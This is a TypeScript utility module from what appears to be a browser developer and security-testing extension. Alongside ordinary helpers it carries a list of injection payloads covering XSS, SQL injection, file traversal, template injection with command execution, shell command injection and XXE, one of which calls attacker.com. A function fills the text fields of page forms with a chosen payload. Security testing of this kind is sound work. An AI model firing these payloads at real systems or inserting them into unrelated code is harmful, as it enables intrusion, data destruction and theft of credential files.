import { diffJson, resolveJsonPath, validateJsonSchema } from '../../../shared/json-tools';
import {
  buildSqlQuery,
  formatSql,
  fromDynamo,
  jsonArrayToCsv,
  lintFirebaseRules,
  normalizeBsonValue,
  suggestIndex,
  toDynamo
} from '../../../shared/data-tools';
import {
  auditAccessibility,
  contrastRatio,
  decodeJwt,
  optimizeSvg,
  runRegexTest,
  safeParseJson
} from '../../../shared/web-tools';

export {
  diffJson,
  resolveJsonPath,
  validateJsonSchema,
  buildSqlQuery,
  formatSql,
  fromDynamo,
  jsonArrayToCsv,
  lintFirebaseRules,
  normalizeBsonValue,
  suggestIndex,
  toDynamo,
  auditAccessibility,
  contrastRatio,
  decodeJwt,
  optimizeSvg,
  runRegexTest,
  safeParseJson
};

export const hexToRgb = (hex: string) => {
  const normalized = hex.replace('#', '').trim();
  if (![3, 6].includes(normalized.length)) return null;
  const expanded =
    normalized.length === 3
      ? normalized
          .split('')
          .map((char) => `${char}${char}`)
          .join('')
      : normalized;
  const int = Number.parseInt(expanded, 16);
  if (Number.isNaN(int)) return null;
  return {
    r: (int >> 16) & 255,
    g: (int >> 8) & 255,
    b: int & 255
  };
};

export const fuzzPayloads = {
  xss: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}',
    '<a href="javascript:alert(1)">click</a>',
    '<div onmouseover="alert(1)">hover</div>',
    '<form><button formaction=javascript:alert(1)>X',
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '</script><script>alert(1)</script>',
    '<object data="javascript:alert(1)">'
  ],
  sqli: [
    `' OR '1'='1`,
    `" OR "1"="1`,
    `' OR '1'='1' --`,
    `' OR '1'='1' /*`,
    `admin' --`,
    `1' ORDER BY 1--`,
    `1' ORDER BY 10--`,
    `1 UNION SELECT NULL--`,
    `1 UNION SELECT NULL,NULL--`,
    `' UNION SELECT username,password FROM users--`,
    `1; DROP TABLE users--`,
    `'; EXEC xp_cmdshell('dir')--`,
    `' AND 1=1--`,
    `' AND 1=2--`,
    `' WAITFOR DELAY '0:0:5'--`,
    `1' AND (SELECT SLEEP(5))--`,
    `' OR SLEEP(5)#`,
    `'; SELECT pg_sleep(5)--`,
    `' || (SELECT version())--`,
    `')) OR (('1'='1`
  ],
  lfi: [
    '../../etc/passwd',
    '../../../etc/passwd',
    '....//....//etc/passwd',
    '..%2f..%2f..%2fetc/passwd',
    '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '/etc/passwd%00',
    '....//....//....//etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '/proc/self/environ',
    '/var/log/apache2/access.log',
    'php://filter/convert.base64-encode/resource=index.php',
    'php://input',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+',
    'expect://id',
    '/etc/shadow',
    '/etc/hosts',
    'C:\\Windows\\System32\\config\\SAM',
    '..%252f..%252f..%252fetc/passwd',
    '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
    'file:///etc/passwd'
  ],
  ssti: [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '*{7*7}',
    '@(7*7)',
    '{{config}}',
    '{{self}}',
    '${T(java.lang.Runtime).getRuntime().exec("id")}',
    '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
    '{{"".__class__.__mro__[2].__subclasses__()}}',
    '${{7*7}}',
    '{{constructor.constructor("return this")()}}',
    '<%=`id`%>',
    '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}',
    '{php}echo `id`;{/php}',
    '{{lipsum.__globals__.os.popen("id").read()}}',
    '${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}',
    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
    '[[${7*7}]]'
  ],
  cmd: [
    '; id',
    '| id',
    '|| id',
    '& id',
    '&& id',
    '`id`',
    '$(id)',
    '; ls -la',
    '| cat /etc/passwd',
    '; ping -c 3 127.0.0.1',
    '| whoami',
    '; uname -a',
    '`whoami`',
    '$(`whoami`)',
    '; sleep 5',
    '| sleep 5',
    '%0aid',
    "'; exec('id')",
    "'; system('id')",
    '\nid'
  ],
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>',
    '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///dev/random">]>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>'
  ]
};

export type FuzzCategory = keyof typeof fuzzPayloads;

export const fuzzCategories: { key: FuzzCategory; label: string; icon: string }[] = [
  { key: 'xss', label: 'XSS', icon: '⚡' },
  { key: 'sqli', label: 'SQLi', icon: '🗄' },
  { key: 'lfi', label: 'LFI', icon: '📁' },
  { key: 'ssti', label: 'SSTI', icon: '🔧' },
  { key: 'cmd', label: 'CMD', icon: '💻' },
  { key: 'xxe', label: 'XXE', icon: '📄' }
];

export const defaultPayloads = [
  ...fuzzPayloads.xss.slice(0, 1),
  ...fuzzPayloads.sqli.slice(0, 1),
  ...fuzzPayloads.lfi.slice(0, 1),
  ...fuzzPayloads.ssti.slice(0, 2)
];

export const parseHeadersInput = (value: string) =>
  value
    .split('\n')
    .map((line) => line.trim())
    .filter(Boolean)
    .map((line) => {
      const index = line.indexOf(':');
      if (index === -1) return null;
      return {
        name: line.slice(0, index).trim(),
        value: line.slice(index + 1).trim()
      };
    })
    .filter(
      (entry): entry is { name: string; value: string } =>
        Boolean(entry?.name)
    );

export const parseQueryParams = (url: string) => {
  try {
    const parsed = new URL(url);
    return Array.from(parsed.searchParams.entries()).map(([key, value]) => ({
      key,
      value
    }));
  } catch {
    return [];
  }
};

export const buildUrlWithParams = (url: string, params: { key: string; value: string }[]) => {
  try {
    const parsed = new URL(url);
    parsed.search = '';
    params
      .filter((entry) => entry.key.trim().length > 0)
      .forEach((entry) => parsed.searchParams.append(entry.key, entry.value));
    return parsed.toString();
  } catch {
    return url;
  }
};

export const extractLinksFromDocument = () => {
  const anchors = Array.from(document.querySelectorAll('a[href]'));
  const internal: string[] = [];
  const external: string[] = [];
  const origin = window.location.origin;
  const seen = new Set<string>();
  anchors.forEach((anchor) => {
    const href = anchor.getAttribute('href');
    if (!href) return;
    let absolute: string;
    try {
      absolute = new URL(href, origin).toString();
    } catch {
      return;
    }
    if (seen.has(absolute)) return;
    seen.add(absolute);
    if (absolute.startsWith(origin)) {
      internal.push(absolute);
    } else {
      external.push(absolute);
    }
  });
  return { internal, external };
};

export const sanitizeHtmlSnapshot = (rawHtml: string) => {
  const parser = new DOMParser();
  const doc = parser.parseFromString(rawHtml, 'text/html');
  doc.querySelectorAll('script').forEach((script) => script.remove());
  return doc.documentElement.outerHTML;
};

export const mapAssetsFromDocument = () => {
  const images = Array.from(document.images)
    .map((img) => img.currentSrc || img.src)
    .filter(Boolean);
  const scripts = Array.from(document.scripts)
    .map((script) => script.src)
    .filter(Boolean);
  const styles = Array.from(document.querySelectorAll('link[rel="stylesheet"]'))
    .map((link) => (link as HTMLLinkElement).href)
    .filter(Boolean);
  return { images, scripts, styles };
};

export const detectTechnologies = () => {
  const findings: { label: string; value: string }[] = [];
  const generator = document
    .querySelector('meta[name="generator"]')
    ?.getAttribute('content');
  if (generator) {
    findings.push({ label: 'Meta Generator', value: generator });
  }
  if ((window as Window & { __REACT_DEVTOOLS_GLOBAL_HOOK__?: unknown })
    .__REACT_DEVTOOLS_GLOBAL_HOOK__) {
    findings.push({ label: 'Framework', value: 'React' });
  }
  if ((window as Window & { __VUE_DEVTOOLS_GLOBAL_HOOK__?: unknown })
    .__VUE_DEVTOOLS_GLOBAL_HOOK__) {
    findings.push({ label: 'Framework', value: 'Vue' });
  }
  if (document.querySelector('[ng-version]')) {
    findings.push({ label: 'Framework', value: 'Angular' });
  }
  const scriptSources = Array.from(document.scripts)
    .map((script) => script.src)
    .filter(Boolean);
  if (scriptSources.some((src) => src.includes('wp-content'))) {
    findings.push({ label: 'CMS', value: 'WordPress' });
  }
  if (scriptSources.some((src) => src.includes('shopify'))) {
    findings.push({ label: 'Platform', value: 'Shopify' });
  }
  if (scriptSources.some((src) => src.includes('cdn.jsdelivr.net/npm/bootstrap'))) {
    findings.push({ label: 'UI Library', value: 'Bootstrap' });
  }
  return findings;
};

export const getFormsSnapshot = () =>
  Array.from(document.querySelectorAll('form')).map((form, index) => {
    const inputs = Array.from(
      form.querySelectorAll('input, textarea, select')
    ).map((input) => ({
      name: input.getAttribute('name') ?? '',
      type: input.getAttribute('type') ?? input.tagName.toLowerCase(),
      placeholder: input.getAttribute('placeholder') ?? ''
    }));
    return {
      index,
      action: form.getAttribute('action') ?? window.location.href,
      method: (form.getAttribute('method') ?? 'GET').toUpperCase(),
      inputs
    };
  });

export type PayloadFieldResult = {
  name: string;
  type: string;
  applied: boolean;
  reason?: string;
};

export type PayloadApplicationResult = {
  success: boolean;
  formFound: boolean;
  totalFields: number;
  appliedCount: number;
  skippedCount: number;
  fields: PayloadFieldResult[];
};

export const applyPayloadToForm = (formIndex: number, payload: string): PayloadApplicationResult => {
  const form = document.querySelectorAll('form')[formIndex];
  if (!form) {
    return {
      success: false,
      formFound: false,
      totalFields: 0,
      appliedCount: 0,
      skippedCount: 0,
      fields: []
    };
  }

  const fields = Array.from(
    form.querySelectorAll('input, textarea, select')
  ) as Array<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>;

  const fieldResults: PayloadFieldResult[] = [];
  let appliedCount = 0;
  let skippedCount = 0;

  fields.forEach((field) => {
    const name = field.name || field.id || `(unnamed ${field.tagName.toLowerCase()})`;
    const type = field instanceof HTMLInputElement
      ? field.type.toLowerCase()
      : field.tagName.toLowerCase();

    if (field instanceof HTMLInputElement) {
      const inputType = field.type.toLowerCase();
      if (['checkbox', 'radio', 'submit', 'button', 'file', 'hidden'].includes(inputType)) {
        fieldResults.push({
          name,
          type,
          applied: false,
          reason: `Skipped: ${inputType} field`
        });
        skippedCount++;
        return;
      }
    }

    if (field instanceof HTMLSelectElement) {
      // For select, we don't inject payload - just note it
      fieldResults.push({
        name,
        type: 'select',
        applied: false,
        reason: 'Skipped: dropdown field'
      });
      skippedCount++;
    } else {
      field.value = payload;
      field.dispatchEvent(new Event('input', { bubbles: true }));
      field.dispatchEvent(new Event('change', { bubbles: true }));
      fieldResults.push({
        name,
        type,
        applied: true
      });
      appliedCount++;
    }
  });

  return {
    success: appliedCount > 0,
    formFound: true,
    totalFields: fields.length,
    appliedCount,
    skippedCount,
    fields: fieldResults
  };
};

export const PREVIEW_SCALE = 0.5;

export const PREVIEW_WIDTH = 960;

export const PREVIEW_HEIGHT = 540;

export const PREVIEW_MARGIN = 12;

export const createPreviewHost = () => {
  const host = document.createElement('div');
  host.style.position = 'fixed';
  host.style.zIndex = '2147483646';
  host.style.pointerEvents = 'none';
  const shadow = host.attachShadow({ mode: 'open' });
  const style = document.createElement('style');
  style.textContent = `
    .preview-card {
      position: fixed;
      border-radius: 14px;
      border: 1px solid rgba(15, 23, 42, 0.8);
      background: rgba(15, 23, 42, 0.92);
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.45);
      padding: 8px;
      width: ${PREVIEW_WIDTH * PREVIEW_SCALE}px;
      height: ${PREVIEW_HEIGHT * PREVIEW_SCALE}px;
      overflow: hidden;
      pointer-events: none;
    }
    .preview-frame {
      width: ${PREVIEW_WIDTH}px;
      height: ${PREVIEW_HEIGHT}px;
      border: none;
      transform: scale(${PREVIEW_SCALE});
      transform-origin: top left;
      background: #0f172a;
    }
    .preview-frame.hidden {
      display: none;
    }
    .preview-title {
      font-size: 10px;
      color: #94a3b8;
      margin-bottom: 6px;
      text-overflow: ellipsis;
      white-space: nowrap;
      overflow: hidden;
      max-width: 100%;
    }
    .preview-fallback {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      width: 100%;
      height: ${(PREVIEW_HEIGHT * PREVIEW_SCALE) - 30}px;
      background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
      border-radius: 8px;
      text-align: center;
      padding: 20px;
      box-sizing: border-box;
    }
    .preview-fallback.visible {
      display: flex;
    }
    .preview-fallback-icon {
      width: 48px;
      height: 48px;
      margin-bottom: 12px;
      opacity: 0.6;
    }
    .preview-fallback-message {
      font-size: 11px;
      color: #94a3b8;
      line-height: 1.4;
      max-width: 90%;
    }
    .preview-fallback-hint {
      font-size: 10px;
      color: #64748b;
      margin-top: 8px;
    }
  `;
  shadow.appendChild(style);
  const wrapper = document.createElement('div');
  wrapper.className = 'preview-card';
  const title = document.createElement('div');
  title.className = 'preview-title';
  wrapper.appendChild(title);
  const frame = document.createElement('iframe');
  frame.className = 'preview-frame';
  frame.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-forms');
  frame.setAttribute('loading', 'lazy');
  wrapper.appendChild(frame);

  const fallback = document.createElement('div');
  fallback.className = 'preview-fallback';
  fallback.innerHTML = `
    <svg class="preview-fallback-icon" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="1.5">
      <path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
    </svg>
    <div class="preview-fallback-message"></div>
    <div class="preview-fallback-hint">Hover another link to try again</div>
  `;
  wrapper.appendChild(fallback);

  shadow.appendChild(wrapper);
  document.body.appendChild(host);
  return { host, wrapper, frame, title, fallback };
};

export const isValidPreviewUrl = (href: string) => {
  try {
    const url = new URL(href);
    return url.protocol === 'http:' || url.protocol === 'https:';
  } catch {
    return false;
  }
};

const KNOWN_BLOCKING_DOMAINS = [
  'x.com',
  'twitter.com',
  'google.com',
  'facebook.com',
  'fb.com',
  'instagram.com',
  'linkedin.com',
  'github.com',
  'reddit.com',
  'youtube.com',
  'tiktok.com',
  'amazon.com',
  'netflix.com',
  'paypal.com',
  'stripe.com',
  'apple.com',
  'microsoft.com',
  'dropbox.com',
  'slack.com',
  'discord.com',
  'twitch.tv'
];

export const isKnownBlockingSite = (href: string): boolean => {
  try {
    const url = new URL(href);
    const hostname = url.hostname.toLowerCase();
    return KNOWN_BLOCKING_DOMAINS.some(
      (domain) => hostname === domain || hostname.endsWith(`.${domain}`)
    );
  } catch {
    return false;
  }
};

export const getPreviewFallbackMessage = (href: string): string => {
  if (isKnownBlockingSite(href)) {
    try {
      const url = new URL(href);
      const domain = url.hostname.replace(/^www\./, '');
      return `${domain} blocks iframe embedding for security. Click to open in new tab.`;
    } catch {
      return 'This site blocks iframe embedding for security.';
    }
  }
  return 'Unable to load preview. The site may restrict embedding.';
};

// React hook utilities are kept in this file for shared tool utilities
export type CursorPosition = { start: number; end: number };

export const saveCursorPosition = (
  event: React.ChangeEvent<HTMLTextAreaElement>
): CursorPosition => ({
  start: event.target.selectionStart,
  end: event.target.selectionEnd
});

export const restoreCursorPosition = (
  element: HTMLTextAreaElement | null,
  position: CursorPosition | null
): void => {
  if (element && position) {
    element.setSelectionRange(position.start, position.end);
  }
};
